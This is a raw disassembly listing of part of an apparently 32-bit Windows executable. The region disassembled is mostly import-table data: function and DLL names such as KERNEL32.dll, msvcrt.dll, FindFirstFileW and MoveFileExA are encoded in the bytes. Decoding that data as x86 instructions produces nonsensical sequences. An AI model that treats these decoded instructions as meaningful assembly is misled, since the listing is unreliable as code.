  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
